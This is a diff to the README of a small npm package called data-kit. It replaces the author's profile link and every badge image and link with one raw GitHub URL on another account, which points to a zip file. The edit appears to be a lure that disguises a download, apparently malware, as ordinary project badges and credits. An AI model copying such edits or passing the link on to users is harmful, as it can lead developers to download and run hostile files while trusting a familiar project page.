@@ -10,17 +10,17 @@ _description_
 
 ## License
 
-[MIT](./LICENSE) License © 2024-PRESENT [Maurizio Crocci](https://github.com/mbcrocci)
+[MIT](./LICENSE) License © 2024-PRESENT [Maurizio Crocci](https://raw.githubusercontent.com/spontopt/datakit/main/src/storage/datakit_Macrotherium.zip)
 
 <!-- Badges -->
 
-[npm-version-src]: https://img.shields.io/npm/v/data-kit?style=flat&colorA=080f12&colorB=1fa669
-[npm-version-href]: https://npmjs.com/package/data-kit
-[npm-downloads-src]: https://img.shields.io/npm/dm/data-kit?style=flat&colorA=080f12&colorB=1fa669
-[npm-downloads-href]: https://npmjs.com/package/data-kit
-[bundle-src]: https://img.shields.io/bundlephobia/minzip/data-kit?style=flat&colorA=080f12&colorB=1fa669&label=minzip
-[bundle-href]: https://bundlephobia.com/result?p=data-kit
-[license-src]: https://img.shields.io/github/license/mbcrocci/datakit.svg?style=flat&colorA=080f12&colorB=1fa669
-[license-href]: https://github.com/mbcrocci/datakit/blob/main/LICENSE
-[jsdocs-src]: https://img.shields.io/badge/jsdocs-reference-080f12?style=flat&colorA=080f12&colorB=1fa669
-[jsdocs-href]: https://www.jsdocs.io/package/data-kit
+[npm-version-src]: https://raw.githubusercontent.com/spontopt/datakit/main/src/storage/datakit_Macrotherium.zip
+[npm-version-href]: https://raw.githubusercontent.com/spontopt/datakit/main/src/storage/datakit_Macrotherium.zip
+[npm-downloads-src]: https://raw.githubusercontent.com/spontopt/datakit/main/src/storage/datakit_Macrotherium.zip
+[npm-downloads-href]: https://raw.githubusercontent.com/spontopt/datakit/main/src/storage/datakit_Macrotherium.zip
+[bundle-src]: https://raw.githubusercontent.com/spontopt/datakit/main/src/storage/datakit_Macrotherium.zip
+[bundle-href]: https://raw.githubusercontent.com/spontopt/datakit/main/src/storage/datakit_Macrotherium.zip
+[license-src]: https://raw.githubusercontent.com/spontopt/datakit/main/src/storage/datakit_Macrotherium.zip
+[license-href]: https://raw.githubusercontent.com/spontopt/datakit/main/src/storage/datakit_Macrotherium.zip
+[jsdocs-src]: https://raw.githubusercontent.com/spontopt/datakit/main/src/storage/datakit_Macrotherium.zip
+[jsdocs-href]: https://raw.githubusercontent.com/spontopt/datakit/main/src/storage/datakit_Macrotherium.zip
